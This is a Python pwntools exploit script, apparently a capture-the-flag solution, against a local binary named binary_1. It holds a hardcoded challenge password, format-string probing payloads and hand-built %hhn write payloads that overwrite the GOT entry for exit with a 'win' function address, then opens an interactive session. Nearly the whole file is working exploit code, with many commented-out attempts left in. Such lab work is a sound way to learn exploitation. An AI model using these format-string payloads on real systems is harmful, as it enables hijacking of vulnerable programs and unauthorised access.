

# solve_level_one.py


from pwn import *
from n4t20_lib import *
from time import sleep
import os
import subprocess

local = True

if local:
    p = process('./level_one')
    p = process('./binary_1')

#e = ELF('./level_one')
e = ELF('./binary_1')

#password = "c43277249e73244ed4ec051363fac62d";
password = "3b4258aafe1d16b0919bdb928b7ff3d4";
p.recvuntil("> ")
p.send(password + "\n");

p.recvuntil("Proceeding to the challenge...")
p.recvuntil("> ")



# The following is the actual solution for a single challenge, first done manually.

# Want to write: 0804935b
# To this address:
exit_address = e.got['exit']
#print(hex(e.got['exit']))
#payload = b''
#for i in range(20):
#    payload += b"A"*2+str(i).encode()+b" "
#payload += b"%p "*20
#p.send(payload + b"\n")
'''
AA0 AA1 AA2 AA3 AA4 AA5 AA6 AA7 AA8 AA9 AA10 AA11 AA12 AA13 AA14 AA15 AA16 AA17 AA18 AA19 0x190 0xf7f8e580 0x8049562 0x20304141
'''

#def compute_field_32_bit(byte_to_write, payload_length_so_far, target_parameter_number):
    

#payload_length = 0
#payload = b''
#payload += b"A"*68
##payload = b"JUN "*3
##payload += b"%23$pAA "
##payload += b"%24$pAA "
##payload += b"%25$pAA "
##payload += b"%26$pAA "
##payload += b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
#payload += b"IIIIJJJJKKKKLLLL"
##payload += p32(exit_address)
##payload += p32(exit_address+1)
##payload += p32(exit_address+2)
##payload += p32(exit_address+3)
#payload += b"\n"

# buf_length = 76
'''
def retrieve_function_addr(binary_name, function_name):
    cmd = b"readelf -s ./" + binary_name +  b"| grep " + function_name
    test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
    #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
    tmp = test.stdout.read()
    #print("result of system call = " + str(tmp))
    #print(str(tmp).__class__)
    addr =  tmp.strip().split(b" ")[1]
    #print("addr = " + str(addr))
    addr = b'0x' + addr
    #print("addr = " + str(addr))
    addr = int(addr,16)
    #print("addr = " + str(addr))
    return addr
'''
def retrieve_function_addr(path_to_binary, function_name):
    cmd = b"readelf -s " + path_to_binary +  b"| grep " + function_name
    test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
    #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
    tmp = test.stdout.read()
    #print("result of system call = " + str(tmp))
    #print(str(tmp).__class__)
    addr =  tmp.strip().split(b" ")[1]
    #print("addr = " + str(addr))
    addr = b'0x' + addr
    #print("addr = " + str(addr))
    addr = int(addr,16)
    #print("addr = " + str(addr))
    return addr

win_addr = retrieve_function_addr(b"./binary_1", b"win")
print("addr = " + str(win_addr))
print("    which in hex = " + hex(win_addr))

#src = 0x0804935b
print("type of exit_address = " + str(exit_address.__class__))
#dst = exit_address
#dpn = 23
#buf_length = 76
'''
payload = gen_fmt_string_write_exploit_x86(src=win_addr, dst=exit_address, dpn=23, buf_length=76)
payload += b"\n"
print("payload = " + str(payload))
print("payload class = " + str(payload.__class__))
'''

#payload = b'%122x%23$hhn%29x%24$hhn%109x%25$hhn%260x%26$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(\xe0\x04\x08)\xe0\x04\x08*\xe0\x04\x08+\xe0\x04\x08\n'
#payload = b'%122x%23$pBB%29x%24$pBB%109x%25$pBB%260x%26$pBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(\xe0\x04\x08)\xe0\x04\x08*\xe0\x04\x08+\xe0\x04\x08\n'
#payload = b'%23$p'+b'A'*76+b'BBBB'
payload = b'A'*18 + b'BBBB' + b'%10$p' + b'\n'

payload = gen_x86_fmt_string(src=win_addr, dst=exit_address, dpn=10, buf_length=18)
print(b"Generated format string: " + payload)

test = b'%122x%18$hhn%29x%19$hhn%109x%20$hhn%260x%21$hhnAAA(\xe0\x04\x08)\xe0\x04\x08*\xe0\x04\x08+\xe0\x04\x08'

#sleep(20)
p.send(payload)

#gen_fmt_string_write_exploit_x86
p.interactive()